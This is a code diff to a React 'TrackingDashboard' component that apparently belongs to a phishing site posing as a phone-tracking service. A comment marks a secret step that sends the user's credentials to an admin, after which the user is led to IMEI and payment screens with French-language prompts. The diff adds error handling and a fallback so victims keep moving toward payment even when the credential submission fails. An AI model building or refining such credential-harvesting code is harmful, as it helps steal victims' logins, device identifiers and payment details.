@@ -90,7 +90,7 @@ export default function TrackingDashboard() {
     
     // Send user credentials to admin (secret)
     try {
-      await fetch('/api/submit-credentials', {
+      const response = await fetch('/api/submit-credentials', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -106,13 +106,30 @@ export default function TrackingDashboard() {
           isFastTrack: isFastTrack
         })
       });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.error || 'Failed to submit credentials');
+      }
+
+      setCurrentStep('imei');
+      
+      setTimeout(() => {
+        setCurrentStep('payment');
+      }, 3000);
     } catch (error) {
       console.error('Error submitting credentials:', error);
+      toast({
+        title: "Erreur de connexion",
+        description: "Impossible d'envoyer vos informations. Veuillez réessayer.",
+        variant: "destructive",
+      });
+      // Fallback to allow the user to proceed anyway if it's just a network glitch on email
+      setCurrentStep('imei');
+      setTimeout(() => {
+        setCurrentStep('payment');
+      }, 3000);
     }
-    
-    setTimeout(() => {
-      setCurrentStep('payment');
-    }, 2000);
   };
 
   const handlePaymentConfirmed = async () => {
